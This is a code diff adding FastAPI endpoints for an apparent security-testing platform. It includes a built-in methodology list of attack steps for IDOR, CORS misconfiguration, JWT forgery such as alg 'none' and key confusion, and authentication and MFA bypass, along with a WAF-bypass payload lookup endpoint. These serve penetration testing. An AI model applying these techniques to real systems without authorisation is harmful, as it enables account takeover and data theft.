+            "Test chained IDOR: access an object then use its sub-resources (e.g., /orders/123/items).",
+            "Look for mass assignment: send extra fields in PUT/PATCH requests (role, userId, isAdmin).",
+            "Automate with Burp Intruder or custom script to iterate IDs ±100 from known IDs.",
+        ],
+    },
+    "cors": {
+        "title": "CORS Misconfiguration",
+        "steps": [
+            "Send requests with Origin: https://evil.com header and inspect Access-Control-Allow-Origin response.",
+            "Test null origin: Origin: null — some configs reflect null allowing file:// exploitation.",
+            "Check if credentials are exposed: Access-Control-Allow-Credentials: true with a reflected origin is critical.",
+            "Test subdomain wildcard bypass: Origin: https://evil.target.com — insecure regex may match.",
+            "Test pre-flight bypass for PUT/DELETE methods with OPTIONS requests.",
+            "Verify the impact: if ACAO reflects origin + ACAC is true, cookies/tokens are exfiltrable cross-origin.",
+            "Check all API endpoints, not just the main domain — subdomains and APIs often have looser CORS.",
+            "Build a PoC HTML page to confirm exploitation in browser context.",
+        ],
+    },
+    "jwt": {
+        "title": "JWT Vulnerability",
+        "steps": [
+            "Decode the JWT (base64url decode header and payload) — check algorithm, expiry, claims.",
+            "Test algorithm confusion: change 'alg' to 'none' and remove the signature — some libraries accept it.",
+            "Test RS256 → HS256 confusion: sign a forged token with HMAC using the server's RSA public key.",
+            "Test weak secret: run jwt_tool or hashcat against the token with a common wordlist.",
+            "Check for sensitive data in payload (passwords, PII, internal IDs).",
+            "Test kid injection: if 'kid' header is used, try path traversal or SQL injection in its value.",
+            "Check token expiry is enforced — try replaying expired tokens.",
+            "Test jku/x5u header injection to point to a remote JWKS controlled by the attacker.",
+        ],
+    },
+    "auth": {
+        "title": "Broken Authentication",
+        "steps": [
+            "Test for username enumeration via different error messages or response timing on login.",
+            "Check for rate limiting on login, password reset, and OTP endpoints — attempt 100+ requests.",
+            "Test password reset flow: predictable tokens, token leakage in Referer header, token reuse.",
+            "Check for account lockout bypass: IP rotation, X-Forwarded-For header manipulation.",
+            "Test MFA bypass: replay old OTP codes, try '000000', test response manipulation (change 'success': false to true).",
+            "Test session fixation: set a known session ID before login and check if the server accepts it post-auth.",
+            "Check secure/HttpOnly cookie flags and session invalidation on logout.",
+            "Test concurrent session limits and token invalidation when password changes.",
+        ],
+    },
+}
+
+@app.post("/api/utils/cvss", dependencies=[Depends(_require_auth)])
+async def utils_cvss(req: CvssRequest):
+    try:
+        return _cvss31_score(req.vector)
+    except Exception as exc:
+        raise HTTPException(status_code=400, detail=str(exc))
+
+@app.post("/api/utils/dedup", dependencies=[Depends(_require_auth)])
+async def utils_dedup(req: DedupRequest):
+    try:
+        import difflib
+        title_lower = req.title.lower()
+        similar = []
+        for fid, f in VULNERABILITIES.items():
+            existing = (f.get("title") or "").lower()
+            if not existing:
+                continue
+            ratio = difflib.SequenceMatcher(None, title_lower, existing).ratio()
+            if ratio >= 0.6:
+                similar.append({"id": fid, "title": f.get("title", ""), "similarity": round(ratio, 2)})
+        similar.sort(key=lambda x: -x["similarity"])
+        is_dup = any(s["similarity"] >= 0.8 for s in similar)
+        confidence = similar[0]["similarity"] if similar else 0.0
+        return {
+            "is_duplicate": is_dup,
+            "similar_findings": [s["title"] for s in similar[:5]],
+            "matches": similar[:5],
+            "confidence": round(confidence, 2),
+        }
+    except Exception as exc:
+        raise HTTPException(status_code=500, detail=str(exc))
+
+@app.post("/api/utils/waf-bypass", dependencies=[Depends(_require_auth)])
+async def utils_waf_bypass(req: WafBypassRequest):
+    waf_data = _WAF_BYPASS.get(req.waf, _GENERIC_WAF_PAYLOADS)
+    payloads = waf_data.get(req.vuln_type, _GENERIC_WAF_PAYLOADS.get(req.vuln_type, []))
+    return {"waf": req.waf, "vuln_type": req.vuln_type, "payloads": payloads}
+
+@app.post("/api/utils/methodology", dependencies=[Depends(_require_auth)])
+async def utils_methodology(req: MethodologyRequest):
+    # Try rich vuln_methodologies module first
+    try:
+        from modules.vuln_methodologies import VULN_METHODOLOGIES
+        data = VULN_METHODOLOGIES.get(req.vuln_class)
+        if data:
+            # Flatten step dicts to strings for the frontend's simple list rendering
+            steps = data.get("steps", [])
+            flat_steps = []
+            for s in steps:
+                if isinstance(s, dict):
+                    flat_steps.append(f"{s.get('name','')}: {s.get('detail','')}")
+                else:
+                    flat_steps.append(str(s))
+            return {"title": data.get("title", req.vuln_class.upper()), "steps": flat_steps,
+                    "tools": data.get("tools", []), "wstg_ids": data.get("wstg_ids", [])}
+    except Exception:
+        pass
+    # Fallback to built-in _METHODOLOGY dict
+    data = _METHODOLOGY.get(req.vuln_class)
+    if not data:
+        raise HTTPException(status_code=404, detail=f"No methodology for '{req.vuln_class}'")
+    return data
+
+
+@app.get("/api/learning/stats")
+async def learning_stats():
+    """Return continuous learning system statistics."""
+    try:
+        from learning.adaptive_planner import LearningSystem
+        ls = LearningSystem()
+        raw = ls.stats()
+        ls.close()
+        # Also pull per-agent EMA rates from KnowledgeBase tool_performance table
+        from learning.knowledge_base import KnowledgeBase
+        from path_manager import db_path as _db_path_fn
+        kb = KnowledgeBase(str(_db_path_fn("knowledge_base.db")))
+        rows = kb._conn.execute(
+            "SELECT tool_name, vuln_type, "
+            "CASE WHEN runs_total > 0 THEN CAST(runs_success AS REAL)/runs_total ELSE 0 END as ema, "
+            "runs_total, findings_total "
+            "FROM tool_performance ORDER BY findings_total DESC"
+        ).fetchall()
+        kb.close()
+        vuln_type_stats: dict = {}
+        for tool, vtype, ema, runs, findings in rows:
+            if not vtype:
+                continue
+            if vtype not in vuln_type_stats:
+                vuln_type_stats[vtype] = {"ema_score": 0.0, "count": 0, "tools": []}
+            vuln_type_stats[vtype]["ema_score"] = max(vuln_type_stats[vtype]["ema_score"], ema or 0.0)
+            vuln_type_stats[vtype]["count"] += findings or 0
+            if tool not in vuln_type_stats[vtype]["tools"]:
+                vuln_type_stats[vtype]["tools"].append(tool)
+        return {
+            "total_findings":   raw.get("confirmed_findings", 0),
+            "sessions":         raw.get("sessions", 0),
+            "unique_targets":   raw.get("unique_targets", 0),
+            "top_vuln_types":   raw.get("top_vuln_types", []),
+            "top_tools":        raw.get("top_tools", []),
+            "vuln_type_stats":  vuln_type_stats,
+        }
+    except Exception as exc:
+        raise HTTPException(status_code=500, detail=str(exc))
+
+
+@app.post("/api/learning/plan", dependencies=[Depends(_require_auth)])
+async def learning_plan(body: Dict[str, Any]):
+    """Generate an adaptive scan plan for a target based on learned patterns."""
+    target = (body.get("target") or "").strip()
+    if not target:
+        raise HTTPException(status_code=400, detail="target is required")
+    tech_stack = [t.strip() for t in (body.get("tech") or "").split(",") if t.strip()]
+    try:
+        from learning.adaptive_planner import LearningSystem
+        ls = LearningSystem()
+        plan = ls.plan_for(target, tech_stack or None)
+        desc = ls.planner.describe_plan(plan)
+        ls.close()
+        return {
+            "target":          target,
+            "tech_stack":      tech_stack,
+            "priority_phases": plan.ordered_phases,
+            "skip_phases":     plan.skip_phases,
+            "tool_overrides":  plan.tool_overrides,
+            "focus_vulns":     plan.focus_vuln_types,
+            "rationale":       plan.rationale,
+            "description":     desc,
+        }
+    except Exception as exc:
+        raise HTTPException(status_code=500, detail=str(exc))
+
+
+@app.get("/api/tools/status", dependencies=[Depends(_require_auth)])
+async def tools_status():
+    """Return installation status for every registered security tool."""
+    try:
+        import sys as _sys
+        _sys.path.insert(0, str(ROOT))
+        from modules.tool_wrappers import ToolRegistry
+        reg = ToolRegistry()
+        status = reg.check_all()
+        cats: dict = {}
+        for name, info_d in status.items():
+            cats.setdefault(info_d["category"], []).append(name)
+        total = len(status)
+        available = sum(1 for v in status.values() if v["available"])
+        return {"tools": status, "categories": cats, "total": total, "available": available}
+    except Exception as exc:
+        raise HTTPException(status_code=500, detail=str(exc))
+
+
+@app.get("/api/tools/capmap", dependencies=[Depends(_require_auth)])
+async def tools_capmap():
+    """Return the full capability map with vuln coverage per tool."""
+    try:
+        import sys as _sys
+        _sys.path.insert(0, str(ROOT))
+        from modules.capability_map import CAPABILITIES
+        from modules.tool_wrappers import is_available
+        conf_map = {"high": 1.0, "medium": 0.6, "low": 0.3}
+        all_vulns = set()
+        for cap in CAPABILITIES.values():
+            if hasattr(cap, "detects"):
+                all_vulns.update(cap.detects)
+        total_vulns = len(all_vulns) or 1
+        result = {}
+        for name, cap in CAPABILITIES.items():
+            detects = list(cap.detects) if hasattr(cap, "detects") else []
+            conf_dict = cap.confidence if hasattr(cap, "confidence") and isinstance(cap.confidence, dict) else {}
+            conf_vals = [conf_map.get(str(v).lower(), 0.5) for v in conf_dict.values()]
+            avg_conf = sum(conf_vals) / len(conf_vals) if conf_vals else 0.5
+            result[name] = {
+                "category": cap.category,
+                "description": cap.description,
+                "vuln_classes": detects,
+                "coverage": round(len(detects) / total_vulns, 3),
+                "confidence": round(avg_conf, 2),
+                "available": is_available(name),
+            }
+        return {"tools": result, "total": len(result), "total_vuln_classes": total_vulns}
     except Exception as exc:
         raise HTTPException(status_code=500, detail=str(exc))
 
